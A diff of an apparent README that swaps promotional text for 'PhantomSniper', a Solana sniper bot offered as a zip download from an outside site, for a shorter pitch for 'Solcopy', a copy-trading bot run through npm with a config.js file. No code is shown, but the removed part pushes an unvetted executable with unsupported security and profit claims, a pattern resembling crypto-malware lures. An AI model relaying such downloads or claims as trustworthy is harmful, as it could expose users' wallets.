@@ -1,40 +1,31 @@
-# PhantomSniper for Solana
+# Solana Copy Trade Bot
 
-## Unleash the Power of PhantomSniper!
+![Solcopy Logo](https://i.imgur.com/tVqMiYx.png)
 
-![PhantomSniper Logo](https://i.imgur.com/x9HxeKf.png)
+Solcopy is an innovative software for copy trading on the Solana blockchain. With Solcopy, users can replicate the trades of expert traders in real-time, optimizing their investment strategies and maximizing returns.
 
-Welcome to PhantomSniper, your ultimate desktop sniper bot designed for the Solana blockchain. Stay ahead of the competition with our cutting-edge features tailored for precision trading.
+![](https://github.com/timuruva/realtime-processing/blob/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
 
-Website: https://phantomsniper.app/
 
-Free trial: https://phantomsniper.app/PhantomSniper.zip
+## Key Features
 
-![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
+- ✅ **Copy Trading**: Automatically copy the trades of successful traders on Solana.
+- ✅ **Intuitive Interface**: User-friendly dashboard for monitoring performance and managing trades.
+- ✅ **Real-Time Updates**: Instant trade execution to ensure timely copying.
+- ✅ **Secure and Transparent**: Built on the secure and transparent Solana blockchain.
+- ✅ **Customizable Settings**: Adjust the copying parameters to fit your risk tolerance and investment goals.
 
-### Key Features
 
-![PhantomSniper Logo](https://i.imgur.com/gt9YDdE.png)
+![](https://github.com/timuruva/realtime-processing/blob/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
 
-- **Real-Time Tracking:** Stay updated with instant notifications on token listings and market movements.
-- **Lightning-Fast Execution:** Execute trades in milliseconds, ensuring you never miss a profitable opportunity.
-- **Advanced Filtering:** Customize your trading strategy with detailed filters for specific tokens and price thresholds.
-- **Secure Transactions:** Your security is our priority; benefit from encrypted transactions and wallet protection.
-- **Intuitive Dashboard:** User-friendly interface with performance tracking and strategy optimization tools.
+## How to use
 
-![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
+To get started with Solcopy, follow these steps:
 
-## Why Choose PhantomSniper?
+1. **Download and extract the files**
+2. **Install dependencies**
+ `npm i`
+3. **Edit the `config.js` file**
+4. **Run the script**
+`npm run trade`
 
-- **Optimized for Solana:** Tailored for efficiency and compatibility within the Solana ecosystem.
-- **Continuous Updates:** Regular improvements to keep you ahead in Solana trading.
-- **Dedicated Support:** 24/7 customer support for any questions or issues.
-
-![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
-
-## Getting Started
- **Download:** https://phantomsniper.app/PhantomSniper.zip
-
-![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
-
-Stay sharp, trade smart, and dominate the Solana marketplace with PhantomSniper!
